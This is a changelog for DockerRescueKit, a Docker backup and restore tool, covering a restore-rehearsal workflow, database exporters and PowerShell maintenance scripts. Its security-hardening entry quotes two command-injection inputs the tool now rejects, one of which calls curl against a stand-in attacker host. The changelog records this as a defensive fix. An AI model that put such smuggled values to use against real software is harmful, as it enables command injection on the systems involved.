# Changelog

All notable changes to DockerRescueKit will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/semver-spec/).

---

## [Unreleased]

---

## [1.2.0-rc.2] - 2026-05-25

Second release candidate of the v1.2 competitive-response sprint. Adds the
**restore-rehearsal workflow** — the single highest-leverage differentiator
identified in `docs/COMPETITIVE_ANALYSIS.md`. No tool in the OSS Docker
backup space ships end-to-end stack restore rehearsal; DRK now does.

### Added

**Restore-rehearsal workflow (R-1)** — see `docs/design/R-1_RESTORE_REHEARSAL.md`
- `RehearsalService` spins up an isolated bridge network (`Internal: true`,
  default subnet `172.31.255.0/24`), restores selected backups into temp
  volumes, brings up stand-in containers with the same image and scrubbed
  env, runs operator-supplied smoke checks, and tears down every resource
  it created. Teardown is guaranteed even on mid-run crash.
- 5 smoke-check runners: `http`, `exec`, `tcp`, `file_exists`,
  `sql_select_1` (postgres/mysql/mssql). Registry pattern — adding a new
  kind requires no edits to the service.
- Concurrency semaphore (default 2; override via `DRK_REHEARSAL_CONCURRENCY`).
- Orphan reaper runs at process start to clean resources labelled
  `com.gozippy.drk.rehearsal=<run-id>` whose run is not in-flight.
- Env scrub strips `*_TOKEN`, `*_SECRET`, `*_KEY`, `*_PASSWORD`, `AWS_*`,
  `STRIPE_*`, `LICENSE_*`, `OAUTH_*`, and `DATABASE_URL` from stand-in
  containers by default. Opt back in per-rehearsal via `options.allowEnvVars`.
- New shared types in `@docker-rescue-kit/shared`: `SmokeCheck`,
  `SmokeCheckResult`, `RehearsalRequest`, `RehearsalReport`,
  `RehearsalStatus`, `RehearsalStep`, `SCRUB_ENV_DEFAULT_PATTERNS`,
  `SMOKE_CHECK_TEMPLATES` (pre-made for the 6 stacks in `STACK_RECIPES.md`).
- New DB table `rehearsals` with policy index + started-desc index.
- REST surface:
  - `POST   /api/rehearsals`            — enqueue, 202 + `{ id, status: 'pending' }`
  - `GET    /api/rehearsals`            — list (`?policyId=&limit=`)
  - `GET    /api/rehearsals/:id`        — full `RehearsalReport`
  - `GET    /api/rehearsals/:id/stream` — Server-Sent Events
    (`event=hello|status|step|check|done`)
  - `POST   /api/rehearsals/:id/abort`  — signal cancel
  - `DELETE /api/rehearsals/:id`        — drop persisted record
- Audit events: `rehearsal.start`, `rehearsal.complete`, `rehearsal.abort`,
  `rehearsal.teardown_failed`.
- 31 new unit tests in `rehearsalService.test.ts` and `rehearsalRoutes.test.ts`
  (validation, env-scrub, registry shape, helper coverage, route status
  codes). Plus a gated integration test
  `integration/rehearsalService.real.test.ts` that exercises the real
  Docker daemon when `CI_INTEGRATION=1`.

**License compliance + positioning (parallel work bundled into this RC)**
- `COMPONENTS.md` — added `sidecars/` as Open Material; appended a
  classification audit log of every v1.2 file addition for LICENSE §22
  compliance.
- `docs/MARKETPLACE_LISTING_DRAFT.md` — status flipped DRAFT → READY TO
  PUBLISH. Locked categories (Databases & storage / Developer tools /
  Monitoring & observability). Incorporated SWOT findings inline and
  added a pricing/feature drift-watch table.

**Vertical side-car (V-1)** — `sidecars/plex/`
- First `gozippy/drk-plex` standalone side-car image. Bundles `restic +
  rclone + docker-cli + tini` in ~30MB Alpine layer. No DRK backend
  required — follows the `itzg/mc-backup` pattern (10M+ pulls from one
  vertical play). Supports local tarball, restic (s3/sftp/b2/azure), and
  rclone backends. Safe Plex quiesce: clears transcoder cache, optional
  `docker stop` with guaranteed restart via shell trap. Structured JSON
  logs ready for future DRK audit-log scraping.
- New top-level `sidecars/` directory classified Open in COMPONENTS.md so
  community contributions are unambiguously allowed.

**Design + planning docs**
- `docs/design/R-1_RESTORE_REHEARSAL.md` — full architecture spec authored
  before implementation; matches the code that landed in this RC.
- `.autoclaw/orchestrator/sprints/v1.2-launch.yaml` — 15-task sprint plan
  with owner assignments, acceptance criteria, and a quarterly watchlist.
  *(gitignored; not part of distribution)*

### Security hardening

- `passwordEnv` in `sql_select_1` smoke checks now validated against
  POSIX env-var name pattern (`/^[A-Za-z_][A-Za-z0-9_]*$/`) before being
  expanded as `$NAME` inside the driver CLI command. Rejects values like
  `PASS"; echo HACK; #` and `PASS$(curl evil.com)` that would break out
  of shell quoting. 6 new tests cover this. Surfaced by a static-analyser
  hit on an unrelated false-positive in a status-message string; the
  flagged string was reworded ("SELECT 1 returned" → "query returned")
  and the actual adjacent injection risk was fixed.
- Sandbox network created with `Internal: true` (no external routing).
- Stand-in containers receive no published ports, no shared networks, no
  Docker socket mount — security guarantees enforced regardless of what
  the source container had.

### Changed

- `packages/backend/src/index.ts` — wires the new `RehearsalService` into
  the `BackupService` constructor and mounts the routes module. One-line
  best-effort orphan reaper call on startup so a crashed run cleans up
  after itself on next boot.
- `packages/backend/src/db/Database.ts` — adds the `rehearsals` table to
  schema init + four CRUD helpers.

### Quality gates

- TypeScript clean across backend + shared + extension
- Jest: 210 passing, 5 skipped (3 pre-existing CI-gated integration tests
  + 2 new R-1 ones), 0 failing
- 43 net new tests in v1.2.0-rc.2 vs rc.1

### Known gaps still deferred to v1.2.1

- **R-2 restore-rehearsal UI wizard** (Kilo Code's scope) — backend
  endpoints are live; UI can mock against the shared types
- **N-1 notification delivery** (Slack / ntfy / email) — rehearsal audit
  events fire today; delivery wires in when N-1 lands
- **B-1 license-key + Free-tier gating** — license-server scaffolding
  exists; not yet enforcing the 5-policy or 1-concurrent-rehearsal caps
- **D-3-followup PolicyWizard step** for all 7 DB exporter kinds
- **Marketplace screenshots** `04-restore-browser.png`,
  `05-storage-vault.png` for the Verified Publisher packet — need a
  running app to capture

---

## [1.2.0-rc.1] - 2026-05-24

Competitive-response release driven by [docs/COMPETITIVE_ANALYSIS.md](docs/COMPETITIVE_ANALYSIS.md).
The Docker Desktop Extension Marketplace category for backup/restore is
effectively empty since Docker archived their own
`docker/volumes-backup-extension` on 2024-10-29. This release closes
the visible feature gap to `tiredofit/docker-db-backup` (DB-engine
parity) and adds positioning content vs. `offen/docker-volume-backup`,
`kopia`, `restic`, and `Duplicati`.

### Added

**Database exporters**
- **InfluxDB** (`{ kind: 'influxdb', version: 'v1' | 'v2', ... }`) — renders
  `influx backup` for v2 (token / org / bucket arguments) and
  `influxd backup -portable` for v1 (with optional `-db <name>`)
- **MSSQL** (`{ kind: 'mssql', db, server?, authMode?, user?, password?, outPath? }`)
  — emits `sqlcmd -Q "BACKUP DATABASE [db] TO DISK = N'...' WITH INIT"`
  with default Windows trusted auth (`-E`) or SQL auth (`-U`/`-P`).
  `WITH INIT` overwrites instead of appending so re-runs don't grow the
  `.bak`. `COMPRESSION` is intentionally omitted for SQL Server Express
  portability.
- Shared `DatabaseExporter` discriminated union in
  `@docker-rescue-kit/shared` updated to match.
- 8 new unit tests covering v1 + v2 InfluxDB paths and Windows-auth,
  SQL-auth, named-instance, and quote-escaping MSSQL paths.

**Documentation — SEO + positioning**
- New `docs/COMPETITIVE_ANALYSIS.md` — SWOT, gap analysis, and watchlist
  for the Docker backup/restore competitive surface
- New `docs/BACKUP_TOOLS_COMPARISON.md` — buyer's-guide comparison vs.
  `offen/docker-volume-backup`, `kopia`, `restic`, `Duplicati`, and
  `tiredofit/docker-db-backup` (linked from README)
- New `docs/STACK_RECIPES.md` — copy-paste DRK policies for Home
  Assistant, Plex/Jellyfin, Immich, Nextcloud, Vaultwarden, and n8n,
  each with pre/post hooks and restore notes

**Marketplace**
- `.autoclaw/internal/marketplace-submission.md` updated: tag bumped
  to `1.2.0`, license field corrected from "MIT" to
  "Source-available (Zippy Technologies Source-Available Commercial
  License v1.3)" per LICENSE §11.2/§11.3, Verified Publisher
  application track added with prerequisite/anti-criteria checklist
- README adds a "two pages to read first" callout pointing to the new
  comparison + recipes docs

**Coordination**
- v1.2 sprint plan filed at
  `.autoclaw/orchestrator/sprints/v1.2-launch.yaml` with P0/P1/P2/P3
  task IDs, owners, acceptance criteria, and a quarterly watchlist
- Cross-agent sprint kickoff and task-assignment messages delivered
  through `.autoclaw/orchestrator/comms/inboxes/`

### Known gaps deferred to v1.2.1

- **Wizard UI for DB exporters** — the new InfluxDB / MSSQL kinds are
  reachable via REST API and JSON-policy import, but no kind has a
  PolicyWizard step yet. Adding a "Database backups" step that covers
  all 7 kinds consistently is tracked as task D-3-followup.
- **Marketplace screenshots** — three of the five screenshots in the
  Verified Publisher packet (`04-restore-browser.png`,
  `05-storage-vault.png`) require a running app to capture; deferred
  pending a dedicated screenshot session.
- All P1 items (restore-rehearsal MVP, notification delivery,
  license-key validation) — tracked in the sprint plan.

---

## [1.1.0] - 2026-05-23

### Added

**Storage Vault — credentials-focused redesign**
- Storage Vault page now reads from `/api/connectors` (the actual AES-256-GCM-encrypted credential store) instead of projecting `policy.storage` blocks; local-filesystem mounts no longer appear here because they have no credentials to vault
- Each credential card shows owning policies, encrypted-field count, connector status, and a delete affordance with a "policies still reference this credential" warning
- New stat tiles: **Stored Credentials**, **Encryption: AES-256-GCM** (with live encrypted-field count), **Unused Credentials** (flags credentials not referenced by any policy)
- **Add Credential** button now opens the existing `AddConnectorWizard` — previously the button was inert and disabled
- Empty state with a single CTA when no credentials are saved yet

**Version label + controls (non-invasive)**
- Small `v<version>` chip in the sidebar footer (also in the mobile drawer) reading from `/api/settings/meta`
- Click-to-open popover with links to **Release notes**, **Changelog**, **All versions on Docker Hub**, and a shortcut to **Open Settings**
- Closes on outside-click or Escape; hidden when the sidebar is collapsed to icon-only

**Docker Desktop Extension — Dual-Transport Support (Phase 8)**
- Native Docker Desktop Extension integration via Unix socket transport (`DRK_TRANSPORT=socket`), in addition to the existing TCP path
- Extension UI now served inside Docker Desktop using the socket transport; standalone container deployments continue to use TCP (port 42880) unchanged
- Vite build flag `VITE_TRANSPORT=extension` sets relative `base` path (`./`) required for `file://` serving within Docker Desktop — TCP builds keep `/`
- `import.meta.env.VITE_TRANSPORT` injected at build time so the React UI can select the correct API transport at runtime
- Tailwind CSS via `@tailwindcss/vite` plugin added to the extension build

### Changed

- **Connectors page renamed to Integrations** in the sidebar nav, and trimmed to a marketplace + Rclone banner only. The duplicated "Active Connections" list is gone — Storage Vault is now the single source of truth for saved credentials
- `/api/settings/meta` now reports the backend's own `package.json` version rather than a hardcoded `'1.0.0'`; the lookup walks up from `__dirname` so it works in both dev (ts-node) and prod (compiled `dist/`) layouts
- Docker Hub image namespace updated to `gozippy` across all image tags, CI references, and documentation (`gozippy/dockerrescuekit`)
- CI/CD pipeline (`.github/workflows/docker.yml`) now builds **and pushes** both the standalone backend image (`gozippy/dockerrescuekit:standalone-*`) and the Docker Desktop Extension image (`gozippy/dockerrescuekit:*`) on `v*` tag pushes; previously only one image was published per release

### Fixed

- Storage Vault no longer shows duplicate "Local Mount" cards for policies that share the same default backup path. Local-filesystem destinations are now visible only through the **Backup Policies** page where they're actually owned
- `metadata.json` updated to satisfy Docker Desktop Marketplace validator requirements: correct icon reference (`drk-icon.svg`), UI tab definition with `root`/`src` fields, and `vm.composefile` pointing to `compose.yaml`

---

## [1.0.0] - 2026-05-11

First public release.

### Added

**WSL Security Updater (`tools/Update-All-WSL.ps1`)**
- Detects all installed WSL distros automatically, skipping Docker-managed distros (`docker-desktop`, `docker-desktop-data`)
- Multi-distro package manager detection: apt/apt-get (Ubuntu, Debian, Kali), dnf/yum (Fedora, RHEL, CentOS, AlmaLinux, Rocky), apk (Alpine), pacman (Arch, Manjaro), zypper (openSUSE)
- Repairs broken package states (interrupted dpkg/apt transactions) before updating
- Per-distro reporting: running kernel version, newest installed kernel, held packages, remaining upgradable packages, reboot-required flag, disk usage before and after
- Automatic retry with WSL reset for transient `HCS_E_CONNECTION_TIMEOUT` failures (common on machines without nested virtualization support)
- Full timestamped log file with per-distro output and final summary
- Parameters: `-LogDir`, `-SkipDockerImages`, `-ForceDockerAll`, `-DryRun`, `-DistroFilter`, `-MaxRetries`, `-RetryDelaySec`, `-AutoElevate`
- Null-byte stripping for WSL UTF-16 LE output on Windows
- PATH translation warning filter (WSL nested virtualization messages demoted to DEBUG)
- WSL engine self-update before distro updates
- Final summary grouped by SUCCESS / FAILED / UNSUPPORTED with actionable tips for failures

**Smart Docker Image Updater (`tools/Invoke-DockerUpdateSafe.ps1`)**
- Image classification engine: LOCAL (no registry digest, skip), PRIVATE (IP/localhost registry, skip), FLOATING (latest/main/edge/etc.), PINNED (version tag), STANDARD
- Built-in security priority list covering 30+ high-CVE repository families (nginx, postgres, redis, node, alpine, ubuntu, debian, python, golang, and more)
- Compose project detection: scans common project directories up to 4 levels deep for `docker-compose.yml` / `compose.yaml` and groups images by project
- Interactive consent menu: security-flagged only, all floating, all pullable, by compose project, custom numbered selection, or skip
- Non-interactive / scheduled task mode: auto-detects `[Environment]::UserInteractive` and falls back to security-only with no prompting
- Post-pull check: identifies running containers whose image was just updated and warns that a restart is needed
- Checkpoint integration: always calls `New-DockerCheckpoint.ps1` before pulling (unless `-SkipCheckpoint`)
- Parameters: `-LogFile`, `-CheckpointDir`, `-DryRun`, `-SecurityOnly`, `-ForceAll`, `-ApproveImages`, `-SkipCheckpoint`

**Rollback Checkpoint (`tools/New-DockerCheckpoint.ps1`)**
- Captures registry digest (`sha256`) for every local image using `docker images --digests` (single fast call, no per-image inspect loop)
- Saves full `docker inspect` snapshot of all containers in a single call
- Generates `Restore-Images.ps1`: a standalone rollback script that pulls each image back to its exact prior digest using `docker pull repo@sha256:...`
- Documents locally-built images (no registry digest) separately with a clear rebuild-from-source note
- Writes `CHECKPOINT_META.json` with timestamp, counts, and restorable vs local-only breakdown
- Parameters: `-CheckpointDir`, `-LogFile`
- Returns checkpoint directory path for use by parent scripts

**Double-click Launcher (`tools/Run-WSL-Updater.bat`)**
- Self-elevating UAC launcher requiring no PowerShell knowledge
- Checks for script existence before launching with a clear error message if missing
- Keeps console window open after completion

**Full Backup (`backup-docker-snapshot.ps1`)**
- Complete point-in-time Docker environment backup: containers, images (saved as .tar), volumes, networks, daemon settings
- Commits running containers as snapshot images before export
- Generates `restore-docker-snapshot.ps1` with full restore instructions
- Parameters: `-BackupPath`, `-BackupName`

**Backup Scheduler (`setup-backup-schedule.ps1`)**
- Registers a Windows Scheduled Task for automated full backups
- Parameters: `-BackupPath`, `-ScriptPath`, `-Schedule`, `-Time`

**Documentation**
- `README.md`: quick-start, requirements, script overview, scheduling guide
- `docs/SCRIPTS.md`: full parameter reference for all scripts
- `ARTICLE.md`: security write-up covering Copy Fail (CVE-2026-31431), Dirty Frag (CVE-2026-43284/43500), and cPanel CVE-2026-41940
- `CONTRIBUTING.md`: contribution guidelines
- `CHANGELOG.md`: this file

### Security

- All PowerShell scripts use ASCII-only characters in executable string literals for compatibility with PowerShell 5.1's CP1252 file encoding (prevents corruption of Unicode characters)
- No credentials, API keys, or personal data in any committed file
- `.gitignore` excludes `.env`, `.local-data/`, log directories, checkpoint archives, and private AI agent configuration
- Docker image updates require explicit user consent before pulling in interactive mode
- Rollback checkpoint is always saved before any image is pulled

### Known Limitations

- WSL distros requiring systemd (Ubuntu 22.04 with default `wsl.conf`) may time out when launched non-interactively on hardware without nested virtualization support. Workaround: set `systemd=false` in `/etc/wsl.conf` inside the affected distro, or update it manually.
- Locally-built Docker images (no registry) cannot be updated or restored via digest — by design.
- Private registries using plain HTTP require `"insecure-registries"` configured in Docker daemon settings for pulls to succeed.
- Compose project names derived from parent directory names may appear as hash strings if Docker Desktop uses temporary directories for compose projects.
